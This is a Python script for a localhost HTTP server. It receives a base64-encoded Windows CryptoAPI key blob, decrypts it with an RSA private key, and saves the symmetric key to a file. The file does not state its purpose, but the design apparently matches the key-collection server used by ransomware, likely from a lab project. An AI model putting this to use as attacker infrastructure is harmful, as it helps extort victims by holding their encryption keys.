from http.server import HTTPServer, BaseHTTPRequestHandler
import struct
import base64
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

def get_privatekey():
    """
    Parse a PRIVATEKEYBLOB and convert it to an RSA private key.
    """
    offset = 0
    # open the private key
    with open("private.pem", "rb") as f:
        b64_pem  = f.read()

    # get the bytes
    blob = base64.b64decode(b64_pem)

    # Read the BLOBHEADER
    # check the struct doc but basically '<BBHI' means little-endian, 2 unsigned char (B), 1 unsigned short(H) and 1 unsigned int(I)
    b_type, b_version, reserved, alg_id = struct.unpack_from('<BBHI', blob, offset)

    # move the offset forward, B is 1 byte, H is 2 byte and I is 4 byte, total of 8
    offset += 8     

    # this is optional, check the key type PRIVATEKEYBLOB (0x07) and the algo CALG_RSA_KEYX (0x0000a400)
    if b_type != 0x07 or alg_id != 0x0000a400:
        raise ValueError("Invalid PRIVATEKEYBLOB format")

    # Read the RSAPrivateKey header and the public exponent (e)
    magic, bitlen, pubexp = struct.unpack_from('<III', blob, offset)

    # move the offset forward total of 12 (3 unsigned int)
    offset += 12

    # this is optional too, check the magic number for 'RSA2' in little-endian
    if magic != 0x32415352:
        raise ValueError("Invalid RSA key magic number")

    # get the key size in bytes
    key_size = bitlen // 8

    # Extract the key parameters, reversing the bytes because they are in little-endian
    modulus = blob[offset:offset + key_size][::-1]          # modulus (n)
    offset += key_size
    prime1 = blob[offset:offset + key_size // 2][::-1]      # prime (p)
    offset += key_size // 2
    prime2 = blob[offset:offset + key_size // 2][::-1]      # prime (q)
    offset += key_size // 2
    exponent1 = blob[offset:offset + key_size // 2][::-1]   # d % (p - 1)
    offset += key_size // 2
    exponent2 = blob[offset:offset + key_size // 2][::-1]   # d % (q - 1)
    offset += key_size // 2
    coefficient = blob[offset:offset + key_size // 2][::-1] # 1/ (q mod p)
    offset += key_size // 2
    private_exponent = blob[offset:offset + key_size][::-1] # private exp (d)

    # Reconstruct the RSA private key
    private_numbers = rsa.RSAPrivateNumbers(
     p=int.from_bytes(prime1, "big"),
     q=int.from_bytes(prime2, "big"),
     d=int.from_bytes(private_exponent, "big"),
     dmp1=int.from_bytes(exponent1, "big"),
     dmq1=int.from_bytes(exponent2, "big"),
     iqmp=int.from_bytes(coefficient, "big"),
     public_numbers=rsa.RSAPublicNumbers(
         e=pubexp,
         n=int.from_bytes(modulus, "big")
     )
    )

    # Generate the private key
    private_key = private_numbers.private_key(backend=default_backend())

    return private_key

def saveKey(encrypted_key, private_key):
    '''
    Decrypt the symmetric key using the RSA private key
    '''
    # Remove the 12 bytes BLOBHEADER and reverse the bytes (they are in little-endian)
    encrypted_key = encrypted_key[12:]
    encrypted_key = encrypted_key[::-1]

    # Decrypt the key using PKCS1v15 as padding (this is insecure but it is the one used by win api)
    decrypted_key = private_key.decrypt(
        encrypted_key,
        padding.PKCS1v15()
    )        

    # Append the unecnrypted BLOBHEADER which is a twelve bytes value of 080200001066000020000000
    blobheader = "080200001066000020000000"

    # Many thanks to Topaco for that. https://stackoverflow.com/questions/68225338/how-to-correctly-decrypt-data-in-python-using-rsa-private-key-blob-from-windows

    # Save the decrypted symmetric key to a file
    with open("key.bin", "wb") as output_file:
        output_file.write(bytes.fromhex(blobheader))
        output_file.write(decrypted_key)

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Get the content length from headers
        content_length = int(self.headers['Content-Length'])
        
        # Read the POST body data
        post_body = self.rfile.read(content_length)

        encrypted_key = base64.b64decode(post_body)

        private_key = get_privatekey()
        saveKey(encrypted_key, private_key)

        # Respond to the client
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"POST data saved to file.")

# Configure the server
HOST = "127.0.0.1"
PORT = 80

if __name__ == "__main__":
    httpd = HTTPServer((HOST, PORT), SimpleHTTPRequestHandler)
    print(f"Serving on http://{HOST}:{PORT}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server.")
        httpd.server_close()
